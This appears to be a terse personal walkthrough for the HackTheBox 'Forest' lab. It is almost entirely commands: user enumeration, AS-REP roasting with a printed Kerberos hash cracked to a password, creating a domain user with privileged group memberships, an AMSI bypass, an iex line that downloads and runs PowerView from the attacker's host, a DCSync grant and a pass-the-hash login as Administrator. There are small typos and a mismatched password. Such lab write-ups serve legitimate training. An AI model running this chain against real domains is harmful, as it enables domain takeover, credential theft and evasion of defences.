ping 10.10.10.161

whatweb 10.10.10.161
namp -sCV -O 10.10.10.161 -> get doamin: htb.local

rpcclient -U "" -N 10.10.10.161
enumdomusers
enumdomgroups

nano user.txt -> type each user name

for user in $(cat user.txt); do impacket-GetNPUsers -no-pass htb.local/${user} -dc-ip forest.htb | grep -v Impacket; done;

cat hash.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:54b1050c17868f2d0cd33eb2f6b97175$5ce600e3e851bfceb3252838f9b7e0e9a4a6f996bdb46467beef7e73956d8681f7e917e56c27994e792d8043148967961e0e872229e827ab6bed15c3e13dbb0910c949a22adcd7dc40347b516860b6f51a20262ee547670ff26afd56dbdeda28d2cc5c34d26855a5bb409cb24ded71026133ca2843140d35587f568303681d10970ab1f628d6a5ed907bba294772e50f637357b25a33517bc970246107184cfc0b91b9b1e0a4058761550246dfb04b01cdfb34ea827f64e2dc9cda3b1661fc34ae58dd77601b7f9e0a77dadd23d6691b499948f93112b1dfd11fe825f0abc100d46c1602f90f

hashcat -m 18200 svc-alfresco_pass.txt '/root/Downloads/rockyou.txt'
hashcat -m 18200 svc-alfresco_pass.txt '/root/Downloads/rockyou.txt' --show
svc-alfresco:s3rvice

evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
cd
more user.txt -> get flag (5f7aad3b7ed3a24d0f328fba158c8667)

net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add

menu
Bypass-4MSI

iex (new-object net.webclient).downloadstring('http://<kali ip>/PowerView.ps1')

$pass = convertto-securestring 'acb123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

impacket-secretsdump htb/john@forest.htb -> get Administrator hash

psyexec.py administrator@forest.htb - hashes <hash found>
cd ..
cd ..
cd Users/Administrator/Desktop
more root.txt -> get flag (9ec412e49ff26ecf7797c30654a85ced)